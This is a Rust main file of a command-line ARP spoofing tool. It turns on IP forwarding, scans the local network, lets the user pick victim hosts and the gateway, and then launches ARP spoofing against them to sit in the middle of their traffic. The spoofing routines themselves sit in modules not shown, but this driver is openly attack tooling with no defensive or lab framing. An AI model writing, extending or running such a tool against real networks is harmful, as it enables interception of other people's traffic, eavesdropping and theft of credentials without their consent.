mod cli;
mod devices;
mod arp_spoof;
mod ip_forward;

use arp_spoof::start_arp_spoofing;
use devices::{get_linux_gateway_ip, get_network_devices};
use cli::{get_local_ip, prompt_retry, scan_ips, select_ips};
use std::{io, net::Ipv4Addr};

fn main() -> io::Result<()> {
    let _ip_forward_guard = ip_forward::IpForwardGuard::new()?;
    // Get network devices
    let devices = get_network_devices()?;
    
    let device_names: Vec<String> = devices.iter()
        .map(|d| d.name.clone())
        .collect();

    let selected_index = cli::select_device(&device_names)?;
    let selected_interface = &devices[selected_index].name.clone();

    // Get local IP address
    let local_ip = match get_local_ip() {
        Ok(ip) => ip,
        Err(e) => {
            eprintln!("Error: {}", e);
            return Ok(());
        }
    };

    // Get gateway IP
    let gateway_ip = get_linux_gateway_ip();

    // Retry loop for scanning and selection
    let (ips, selected_indices) = loop {
        // Scan for IP addresses
        let ips = match scan_ips(selected_interface, &local_ip) {
            Ok(ips) => ips,
            Err(e) => {
                eprintln!("Scanning error: {}", e);
                if !prompt_retry("Retry scanning? (Y/n)")? {
                    return Ok(());
                }
                continue;
            }
        };

        // Select IPs
        match select_ips(&ips, &gateway_ip) {
            Ok(indices) if !indices.is_empty() => break (ips, indices),
            Ok(_) => {
                eprintln!("No IP addresses selected!");
                if !prompt_retry("Retry selection? (Y/n)")? {
                    return Ok(());
                }
            }
            Err(e) => {
                eprintln!("{}", e);
                if !prompt_retry("Retry scanning? (Y/n)")? {
                    return Ok(());
                }
            }
        }
    };

    // Display selected IPs
    println!("\nSelected IP addresses:");
    for index in &selected_indices {
        println!("- {}", ips[*index]);
    }

    // Convert to IPv4 addresses
    let gateway_ip = gateway_ip.parse::<Ipv4Addr>().unwrap();
    let target_ips: Vec<Ipv4Addr> = selected_indices
        .iter()
        .map(|&i| ips[i].parse().unwrap())
        .collect();

    // Start ARP spoofing
    match start_arp_spoofing(selected_interface, target_ips, gateway_ip) {
        Ok(_) => println!("ARP spoofing started successfully."),
        Err(e) => eprintln!("Error starting ARP spoofing: {}", e),
    }

    Ok(())
}
